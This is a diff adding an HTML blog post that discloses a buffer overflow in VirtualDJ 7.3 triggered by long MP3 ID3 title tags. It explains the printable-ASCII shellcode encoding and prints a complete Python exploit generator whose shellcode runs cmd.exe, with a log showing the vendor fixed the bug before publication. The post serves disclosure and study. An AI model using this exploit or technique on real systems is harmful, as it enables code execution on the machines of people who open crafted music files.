@@ -1,0 +1,176 @@
+<!-- This file has been auto-generated! -->
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>VirtualDJ Pro/Home 7.3: Buffer Overflow</title>
+        <!-- Style -->
+        <link rel="stylesheet" href="../../css/code.css">
+        <link rel="stylesheet" href="../../css/markdown.css">
+        <style>
+            body {
+                box-sizing: border-box;
+                min-width: 200px;
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 45px;
+            }
+
+            header {
+                position: relative;
+            }
+            header > .links {
+                position: absolute;
+                right: 0;
+            }
+
+            .post-key {
+                background-color: hsl(45, 67%, 80%);
+                border-radius: 5px 0px 0px 5px;
+                padding: 2px 6px 2px 8px;
+                margin: 0px;
+            }
+            .post-val {
+                background-color: hsl(45, 67%, 90%);
+                border-radius: 0px 5px 5px 0px;
+                padding: 2px 8px 2px 6px;
+                margin: 0px;
+            }
+
+            footer {
+                text-align: center;
+            }
+        
+            @media (max-width: 767px) {
+                body {
+                    padding: 15px;
+                }
+            }
+        </style>
+    </head>
+    <body class="markdown-body">
+        <header>
+            <div class="links">
+                <span>
+                    <a href="https://twitter.com/AlexAltea">Twitter</a> |
+                    <a href="https://github.com/AlexAltea">Github</a> |
+                    <a href="mailto:alexandro@phi.nz">Email</a>
+                </span>
+            </div>
+            <span><a href="../../">&lt; Other articles</a></span>
+        </header>
+        <article>
+            <h1>VirtualDJ Pro/Home 7.3: Buffer Overflow</h1>
+            <p>
+                <span 
+                    class="post-key">Author</span><span
+                    class="post-val">Alexandro Sanchez</span>
+                <span
+                    class="post-key">Date</span><span
+                    class="post-val">2013-03-30</span>
+            </p>
+            <p>I have found a buffer overflow vulnerability in <a href="http://www.virtualdj.com/">VirtualDJ Pro 7.3 and VirtualDJ Home 7.3</a> and possibly previous versions of this software. When the user enters a folder, VirtualDJ tries to retrieve all information from the ID3 tags of MP3 files inside such as <em>Title</em>, <em>Album</em>, and <em>Artist</em> and stores it in a buffer. After that, a second buffer of length 4096 is allocated in the stack and only the characters <code>[A-Z]</code> from the first buffer will be copied to it. According to the ID3 v2.x standard, these tags can have a length greater than 4096; therefore it is possible to produce a buffer overflow in this second buffer. At the time when the buffer overflow happens and the program reaches the <code>retn</code> instruction, the <code>edi</code> register points to the first buffer.</p>
+<p>We cannot assign the <code>eip</code> the address of the first buffer directly since it contains characters which are not in range A-Z. However if we take into account the previous information, we can do this indirectly: We write in the bytes 4100:4104 of the title <code>"FSFD"</code>. After the buffer overflows occurs we get <code>eip == 0×44465346 == "FSFD"</code>. At this address (inside <em>urlmon.dll</em>) we find a <code>call edi</code> instruction and so the bytes in the first buffer will be executed. Now we face another problem. VirtualDJ has inserted a 0xC3 byte (<code>retn</code>) before each non-printable ASCII character in the first buffer and we cannot execute the shellcode directly. We can solve this by pushing into the stack the bytes of the shellcode using only printable ASCII characters. Let me explain:</p>
+<p>Instead of pushing the bytes 0xB8, 0xFF, 0xEF, 0xFF (FFEFFFB8h) directly, we can do exactly the same using only printable ASCII characters by using the string <code>"%@@@@%????-R@D@-R@D@-R@D@-R?C?P"</code>:</p>
+<div class="codehilite"><pre><span></span><span class="nf">and</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40404040</span><span class="no">h</span>   <span class="c">; 25 40 40 40 40  == &quot;%@@@@&quot;</span>
+<span class="nf">and</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">3</span><span class="no">F3F3F3Fh</span>   <span class="c">; 25 3F 3F 3F 3F  == &quot;%????&quot;  &lt;– eax == 0</span>
+<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">3</span><span class="no">F433F52h</span>   <span class="c">; 2D 3F 43 3F 52  == &quot;-R?C?&quot;  &lt;– eax == 0xFFEFFFB8</span>
+<span class="nf">push</span>  <span class="no">eax</span>              <span class="c">; 50              == &quot;P&quot;</span>
+</pre></div>
+
+
+<p>Once all the bytes of the shellcode are pushed into the stack (in inverse order) we use <code>push esp</code> (0×54) and <code>retn</code> (0xC3) to run the shellcode. Obviously, it does not matter if VirtualDJ pushes another 0xC3 byte before this one.</p>
+<p>This is a pretty serious vulnerability since VirtualDJ is considered the #1 software for mixing music with millions of downloads around the world. By exploiting this vulnerability it would be possible to spread quickly a malware just by uploading a malicious MP3 file in a popular site. Even worse, this file might not be a suspicious file for antivirus software. Note how the 4096 padding bytes could be replaced by something apparently harmless such as the real title of the MP3 file followed by a lot of spaces.</p>
+<div class="codehilite"><pre><span></span><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.3 Buffer Overflow Vulnerability </span>
+<span class="c1">#By: Alexandro Sanchez Bach | functionmixer.blogspot.com </span>
+<span class="c1">#More info: http://www.youtube.com/watch?v=PJeaWqMJRm0</span>
+
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="k">def</span> <span class="nf">unicodeHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span> <span class="n">c</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">+</span><span class="n">c</span>
+    <span class="k">return</span> <span class="n">c</span><span class="o">+</span><span class="s2">&quot;00&quot;</span>
+
+<span class="k">def</span> <span class="nf">movEAX</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="c1">#Arrays </span>
+    <span class="n">s</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+    <span class="n">inst</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="mi">512</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="mi">512</span><span class="p">]</span>
+    <span class="n">carry</span>  <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">:</span>
+            <span class="n">target</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">256</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">carry</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+    <span class="n">diff</span> <span class="o">=</span> <span class="p">[</span><span class="n">target</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">-</span> <span class="n">s</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+
+    <span class="c1">#Gen instructions </span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="n">target</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">-</span> <span class="n">diff</span><span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="o">/</span><span class="mi">4</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+        <span class="n">inst</span> <span class="o">+=</span> <span class="p">[[</span><span class="n">diff</span><span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="o">/</span><span class="mi">4</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]]</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="n">target</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">-</span> <span class="n">s</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">+</span> <span class="n">carry</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+    <span class="n">inst</span> <span class="o">+=</span> <span class="p">[</span><span class="n">target</span><span class="p">]</span>
+
+    <span class="c1">#Remove characters &#39;[&#39;,&#39;\&#39;,&#39;]&#39; </span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;[&quot;</span><span class="p">)</span>  <span class="ow">in</span> <span class="p">[</span><span class="n">inst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span> <span class="ow">or</span> \
+           <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="n">inst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span> <span class="ow">or</span> \
+           <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;]&quot;</span><span class="p">)</span>  <span class="ow">in</span> <span class="p">[</span><span class="n">inst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]:</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+                <span class="n">inst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="o">=</span> <span class="n">inst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="p">((</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+
+    <span class="n">inst</span>  <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x2D</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">inst</span><span class="p">]</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>
+
+<span class="c1">#Shellcode: Run cmd.exe </span>
+<span class="n">shellcode</span>  <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3</span><span class="s2">&quot;</span>
+<span class="n">retAddress</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xED\x1E\x94\x7C</span><span class="s2">&quot;</span> <span class="c1"># JMP ESP ntdll.dll WinXP SP2 </span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">retAddress</span>
+
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="mi">4</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+    <span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x25\x40\x40\x40\x40\x25\x3F\x3F\x3F\x3F</span><span class="s2">&quot;</span>  <span class="c1">#EAX = 0 </span>
+    <span class="n">exploit</span> <span class="o">+=</span> <span class="n">movEAX</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>  <span class="c1">#EAX = shellcode[i:i+4] </span>
+    <span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x50</span><span class="s2">&quot;</span>  <span class="c1">#PUSH EAX </span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x54\xC3</span><span class="s1">&#39;</span> <span class="c1">#PUSH ESP; RETN </span>
+
+<span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">exploit</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="n">exploit</span> <span class="o">+=</span>  <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4100</span> <span class="o">-</span> <span class="n">c</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;FSFD&quot;</span>
+
+<span class="k">print</span> <span class="n">exploit</span>
+<span class="c1">#Paste the generated code in the tag &#39;Title&#39; of the MP3 file.</span>
+</pre></div>
+
+
+<p>You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=PJeaWqMJRm0.</p>
+<h2 id="log">Log</h2>
+<ul>
+<li><strong>2012-11-29</strong>: Bug discovered. VirtualDJ was emailed about this a few days later.</li>
+<li><strong>2013-03-20</strong>: Bug fixed with the release of VirtualDJ Pro/Home 7.4.</li>
+<li><strong>2013-03-29</strong>: Exploit published.</li>
+</ul>
+        </article>
+        <hr>
+        <footer>
+            <p>
+                Questions? Comments? <a href="https://github.com/AlexAltea/blog/issues">Open an issue!</a>
+            </p>
+            <p><a href="mailto:alexandro@phi.nz">alexandro@phi.nz</a></p>
+        </footer>
+    </body>
+</html>
